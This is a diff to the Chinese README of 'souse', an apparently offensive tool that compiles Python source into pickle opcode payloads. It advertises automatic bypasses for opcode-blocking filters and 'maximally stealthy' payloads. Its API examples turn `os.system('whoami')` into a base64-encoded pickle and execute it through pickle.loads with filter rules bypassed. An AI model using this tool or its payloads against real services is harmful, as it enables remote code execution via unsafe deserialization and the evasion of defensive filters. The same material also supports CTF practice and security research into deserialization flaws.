@@ -9,7 +9,7 @@
 
 ## 2. 核心特性
 
-- **🚀 智能重构**: 自动将原本无法直接序列化的 Python 源码重构为完全兼容的 Pickle 指令流（例如：自动将下标赋值 `a[k]=v` 转换为 `__setitem__` 调用）。
+- **🚀 智能重构**: 自动将原本无法直接序列化的 Python 源码重构为完全兼容的 Pickle 指令流（例如：自动将下标赋值 `a[k]=v` 转换为 `__setitem__` 调用）。若涉及到较为复杂的源码转换，可以在 souse 之前，使用这个项目: [parselmouth](https://github.com/Macr0phag3/parselmouth)
 - **✨ 自动化内置支持**: 自动识别并导出 `open`、`eval`、`getattr` 等 Python 内置函数，无需手动导入，开箱即用。
 - **🛡️ 灵活防火墙绕过**: 针对 `R`、`o`、`i`、`u`、`b` 等核心指令提供多种自动化绕过方案，支持自定义指令禁用规则。
 - **⚡ 极致 Payload 优化**: 内置 `pickletools` 优化逻辑，自动精简指令流，确保 Payload 体积最小且隐蔽性最高。
@@ -19,36 +19,96 @@
 
 ## 3. 使用方法
 ### 3.1 命令行 (CLI)
-`./test/` 目录下有一些演示代码。
+`./souse/cases/` 目录下有一些演示代码。
 
-示例见原版 [README](./README.md#21-cli)。
+#### 3.1.1 示例 1
 
-#### 3.1.0 提示
-你可以通过在源码最后一行写变量名，来控制反序列化的最终返回值。
+源代码：
 
-示例：
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1.png" width="300">
+
+opcode:
+
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1-s.png" width="600">
+
+#### 3.1.2 示例 2
+
+源代码:
+
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2.png" width="300">
+
+opcode:
+
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2-s.png" width="600">
+
+#### 3.1.3 示例 3
+
+You can control the final deserialization result by writing a variable name as the last line of the source code:
+
 ```py
-a = "whoami"
-a
+c=10
+a = {}
+a["empty"] = ""
+c
 ```
 
-### 3.2 编程接口 (API)
-示例：
+#### 3.1.4 示例 4
+
+转换后的 opcode:
+
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-3.png" width="600">
+
+支持的转换函数:
+- [x] base64_encode
+- [x] hex_encode
+- [x] url_encode
+
+#### 3.1.5 测试代码
+
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/test.png" width="400">
+
+#### 3.1.6 运行测试
+
+```bash
+python souse/souse.py --run-test
+```
+
+- 需要安装 `pytest`
+
+### 3.2 API
+示例:
 
 ```py
-import souse
-import pickle
+In [1]: import souse
 
-exp = "from os import system\nsystem('whoami')"
+In [2]: exp = "from os import system\nsystem('whoami')"
 
-# 使用 API 进行转换，并应用防火墙绕过规则
-firewall_rules = {"R": "*", "V": "*"}
-result = souse.API(exp, optimized=True, transfer=pickle.loads, firewall_rules=firewall_rules).generate()
+In [3]: souse.API(exp, optimized=True, transfer=pickle.loads).generate()
+macr0phag3
+Out[3]: 0
 
-# 输出：
-# [*] choice o to bypass rule: {'R': '*'}
-# [*] choice S to bypass rule: {'V': '*'}
-# macr0phag3
+In [4]: import base64
+
+In [5]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
+Out[5]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='
+
+In [6]: souse.API(exp, optimized=True, transfer=[bytes.decode, str.encode, base64.b64encode]).generate()
+Out[6]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='
+
+In [7]: import pickle
+
+In [8]: firewall_rules = {
+    ...:     "V": "*",
+    ...:     "I01": "*",
+    ...:     "I": "100",
+    ...:     "R": "*"
+    ...: }
+
+In [9]: souse.API(exp, optimized=True, transfer=pickle.loads, firewall_rules=firewall_rules).generate()
+[*] choice o to bypass rule: {'R': '*'}
+[*] choice S to bypass rule: {'V': '*'}
+macr0phag3
+Out[9]: 0
 ```
 
 ## 4. 开发计划 (TODO)
